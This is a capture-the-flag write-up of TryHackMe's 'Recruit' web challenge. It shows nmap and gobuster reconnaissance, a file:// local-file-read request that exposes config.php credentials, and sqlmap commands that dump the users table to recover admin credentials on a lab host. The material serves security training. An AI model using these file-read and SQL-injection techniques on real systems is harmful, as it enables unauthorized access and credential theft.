# TryHackMe Recruit-CTF Writeup | Muhammad Zaid
Recruit-CTF By TryHackMe is a solid web application pentesting challenge to test your skills in web.

the link to room is : https://tryhackme.com/room/recruitwebchallenge

<img width="1100" height="510" alt="image" src="https://github.com/user-attachments/assets/9eb7b832-191c-491b-993e-6072662d145a" />

## Prerequisites
- SQL injection
- SQLMap
- Burpsuite
- Nmap
- Directory Brute Forcing

## Story
> Recruit has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.
> Can you gain an initial foothold, escalate your access, and ultimately log in as the administrator?

## Step 1:

Reconasaince using namap before exploiting target you should know what services are running there

`
nmap -A -T4 10.112.173.245 -vv -oN scan.txt
`
we got the output

```
# Nmap 7.99 scan initiated Sun Sep 27 18:57:36 2026 as: /usr/lib/nmap/nmap --privileged -A -T4 -vv -oN scan.txt 10.112.173.245
Increasing send delay for 10.112.173.245 from 0 to 5 due to 112 out of 279 dropped probes since last increase.
Increasing send delay for 10.112.173.245 from 5 to 10 due to 11 out of 27 dropped probes since last increase.
Nmap scan report for 10.112.173.245
Host is up, received reset ttl 62 (0.24s latency).
Scanned at 2026-09-27 18:57:37 PKT for 59s
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 80:56:00:5a:2a:1a:b1:ff:4e:c6:bb:09:a3:50:c8:93 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/3U2Qk1d/Fc0O16kC1KDXNuMjrYxRZnj6IrjEaO/gU94LaLUwrEIuvtcUfJIriJebnNqeZzHh6HUyNqfiuoxGuk6RzmPXdbFFFaKczB9PZwrmvpFVPepRCM6X5QLXO7wlhn7Gx84ReH/KUx2vMmPlxcjrP2Ralnc5+PKo4tEdHvCQnU0vxtz+IN8yzJQ/o/VOQTfcL+k7RrgiyssSxYPKC3nRr5hfhbXIvLGCV7zGJTHicOpmIPXTBK1essxInM1uHC9KUAvptvtiTh8HKkRibS8DosZ0SiJL6d5O0NMrNIECsal76reHbvSXUXW+W01EkQJW91+bUnKge0MkRBaO7iWYbXXBeia4Gh78TEBtAxyVAumIH9TdoNqfXw/ryiTZR25MF/erw6U6v92gclmx0YvRFeJ+/Z5NSLUpsbTiaB7exCNxq6Y7V9Cn4NEI2rANEzmh+lVKMvH4yHmihAQaNBfB9BCbzeeI3SEI3PJ74gItcT8mPRSpBFaJw6bQyNs=
|   256 cc:78:fa:a9:2f:17:51:8c:52:c4:ea:33:b5:64:87:b8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDBbMix68BdpZZn1ejBEo9n0xgeXhDpPgQ78ttiRWm5kq2DwZSD1jBFhl92yLPQCL8N5Q8dl+1TsPjHbefKj2gg=
|   256 11:46:82:6e:76:ac:58:59:a5:6d:bc:37:c9:f6:f1:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDvJf8lMUKHWqrrwC5kOoipTJWOK3Yg4NYyQ1+MTwkGl
53/tcp open  domain  syn-ack ttl 62 ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Recruit
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=9/27%OT=22%CT=1%CU=36370%PV=Y%DS=3%DC=T%G=Y%TM=6AB9210
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=F5%GC
OS:D=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E
OS:8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%
OS:W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 11.136 days (since Wed Sep 16 15:42:07 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=245 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   340.70 ms 192.168.128.1
2   ...
3   340.89 ms 10.112.173.245

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 27 18:58:36 2026 -- 1 IP address (1 host up) scanned in 60.23 seconds
```

port 80 open there meaning that a web service is running there

<img width="1100" height="468" alt="image" src="https://github.com/user-attachments/assets/a1fa4360-b433-4b01-a7c0-f85e55c68316" />

i saw a web page that is asking for credentials

i saw the page source i didn’t find anything now we can perform a directory brute force attack

## Step 2 using Gobuster to find hidden directories

`
gobuster dir -u http://10.112.173.245 -w /usr/share/wordlists/dirb/common.txt -o recon.txt
`
<img width="1100" height="463" alt="image" src="https://github.com/user-attachments/assets/544e5818-5c8a-4ced-a4d2-6615dd30c706" />

i saw some important directories

i started visiting every directory one by one

start with mail

<img width="1100" height="504" alt="image" src="https://github.com/user-attachments/assets/c4f348b0-d2de-453f-9ccb-472ee16c66b6" />

i got some important details there the username is `hr` and the password is stored in the `config.php` file.

there is a `access API` features in the web page that we visit

<img width="1100" height="511" alt="image" src="https://github.com/user-attachments/assets/4c69315d-8efb-4174-8a23-621a8ef72f23" />

we can perform the LFI (local file inclusion) attack

Local File Inclusion (LFI) is a critical web application security vulnerability that allows attackers to trick a server into including and executing local files stored on the same machine

so from here we can execute the config.php file

`
http://10.112.173.245//file.php?cv=file:///var/www/html/config.php
`
using this url.

<img width="1100" height="531" alt="image" src="https://github.com/user-attachments/assets/7e9f9601-ad03-41dc-8ddc-4a85f00ecba0" />

we got the hr password also
`
hrpassword123
`
now we have HR credentials and now we can log into as hr

<img width="1100" height="547" alt="image" src="https://github.com/user-attachments/assets/c9514215-4a35-47e8-99a2-b2d786fb62ef" />

now we have obtained the user flag now its time to escalate our priveleges

Escalating Priveleges by performing the SQLi attack

you can simply just search something and then after searching add `'` single quote at the end of your url and capture the request using Burpsuite

<img width="1100" height="493" alt="image" src="https://github.com/user-attachments/assets/b0d9dfb2-2c67-4e5a-a959-62712069e2a9" />

<img width="1100" height="282" alt="image" src="https://github.com/user-attachments/assets/833d947a-e127-4fb9-87d0-0492adae29a4" />

and right click the request and click and save the file

for this we are going to use SQLMap tool that is the most powerful tools for Performing SQL Injection attacks

## Using SQL Map

`
sqlmap -r req.txt --dbs
`
the sqlmap will read the request in the file req.txt that we saved from burpsuite and — dbs will show us all the databases availbe
<img width="1100" height="471" alt="image" src="https://github.com/user-attachments/assets/01f7c75b-76af-4ad8-8642-e6cb63145b58" />

the databse we got is `recruit_db`

now we have the databse name now next step is to enumerate the table in the database

`sqlmap -r req.txt -D recruit_db --tables`
now we are telling to sqlmap that the databse is recruit_db now enumerate the tables

<img width="1100" height="551" alt="image" src="https://github.com/user-attachments/assets/0f565472-b34e-4c96-b458-753e04b760c8" />

the table is `users`
now we want to dump all the data that is int he table

`sqlmap -r req.txt -D recruit_db -T users --dump`

<img width="1100" height="591" alt="image" src="https://github.com/user-attachments/assets/2989340d-85ea-4c24-a801-3595fe8520fe" />

now we got the admin credentials which are

`
username = admin
pass = admin@001admin
`
now log out from the hr portal and log in as admin

<img width="1100" height="474" alt="image" src="https://github.com/user-attachments/assets/c2ace804-c8b0-4f6d-8d63-d63a060dc68a" />

and you got the flag

congratulations!!!!!

lab has been solved

i hope that it will help you

Happ hacking!!!!!!!!!!!!!!!!!!!!!

## Connect with me 
TryHackMe : https://tryhackme.com/p/muhmmadzaid2009  
Linkedin : https://www.linkedin.com/in/muhammad-zaid2009/  
X : https://x.com/muhammadzaid49  
Medium : https://medium.com/@muhammadzaid2009



